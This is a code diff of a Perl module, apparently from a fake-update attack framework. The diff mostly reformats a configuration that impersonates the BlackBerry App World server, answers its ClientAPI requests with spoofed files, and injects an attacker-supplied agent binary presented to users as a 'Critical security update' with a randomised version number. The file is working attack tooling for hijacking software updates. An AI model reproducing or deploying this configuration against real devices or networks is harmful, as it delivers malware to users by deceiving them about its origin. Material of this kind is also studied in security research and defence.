@@ -27,77 +27,81 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'bbappworld',
-    'version' => '1.0',
-    'appver'  => '< 1.1.0.33',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com>' ],
-    'description' => qq{},    
-    'vh' => 'appworld.blackberry.com',
+my $base = {
+    'name'        => 'bbappworld',
+    'version'     => '1.0',
+    'appver'      => '< 1.1.0.33',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com>'],
+    'description' => qq{},
+    'vh'          => 'appworld.blackberry.com',
+
     #http://drbolsen.wordpress.com/2008/07/14/coddec-released/
     #http://www.dontstuffbeansupyournose.com/?p=99
     'request' => [
-		    {
-		    'req' => '/ClientAPI/content/', #regex friendly #10.0
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => "",
-		    'parse' => 0,
-		    'file' => './include/bbappworld/click_aplicacion',
-                    'cheader' => "HTTP/1.1 200 OK\r\n",                                                                                           
-		    },
-		    {
-		    'req' => '/ClientAPI/featured', #regex friendly #10.0
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => "",
-		    'parse' => 0,
-		    'file' => './include/bbappworld/featured',
-                    'cheader' => "HTTP/1.1 200 OK\r\n",                                                                                                                       
-		    },
-		    {
-		    'req' => '/ClientAPI/image/', #regex friendly #10.0
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => "",
-		    'parse' => 0,
-		    'file' => './include/bbappworld/images',
-                    'cheader' => "HTTP/1.1 200 OK\r\n",                                                                                                                       
-		    },
+        {   'req'    => '/ClientAPI/content/',    #regex friendly #10.0
+            'type'   => 'file',                   #file|string|agent|install
+            'method' => '',                       #any
+            'bin'    => 0,
+            'string' => "",
+            'parse'  => 0,
+            'file'    => './include/bbappworld/click_aplicacion',
+            'cheader' => "HTTP/1.1 200 OK\r\n",
+        },
+        {   'req'    => '/ClientAPI/featured',    #regex friendly #10.0
+            'type'   => 'file',                   #file|string|agent|install
+            'method' => '',                       #any
+            'bin'    => 0,
+            'string' => "",
+            'parse'  => 0,
+            'file'    => './include/bbappworld/featured',
+            'cheader' => "HTTP/1.1 200 OK\r\n",
+        },
+        {   'req'    => '/ClientAPI/image/',      #regex friendly #10.0
+            'type'   => 'file',                   #file|string|agent|install
+            'method' => '',                       #any
+            'bin'    => 0,
+            'string' => "",
+            'parse'  => 0,
+            'file'    => './include/bbappworld/images',
+            'cheader' => "HTTP/1.1 200 OK\r\n",
+        },
 
-
-		    {
-		    'req' => '.yim', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
+        {   'req'    => '.yim',                   #regex friendly
+            'type'   => 'agent',                  #file|string|agent|install
+            'method' => '',                       #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
 
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.cab', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 0, 
-			    	  'desc' => 'Status'},
-		    'description'  => { 'val' => 'Critical security update',
-			    	  'desc' => 'Description display in the update'},
-                    'version'  => { 'val' => '\'30.\'.isrcore::utils::RndNum(1).\'.\'.isrcore::utils::RndNum(4).\'.\'.isrcore::utils::RndNum(1)',
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-				},
-                    'rnd1'  => { 'val' => 'isrcore::utils::RndNum(5)',
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-                            }			    	  
-		 }
-};
 
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.cab', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 0,
+            'desc' => 'Status'
+        },
+        'description' => {
+            'val'  => 'Critical security update',
+            'desc' => 'Description display in the update'
+        },
+        'version' => {
+            'val' =>
+                '\'30.\'.isrcore::utils::RndNum(1).\'.\'.isrcore::utils::RndNum(4).\'.\'.isrcore::utils::RndNum(1)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+        'rnd1' => {
+            'val'     => 'isrcore::utils::RndNum(5)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        }
+    }
+};
 
 ##########################################################################
 # FUNCTION      new
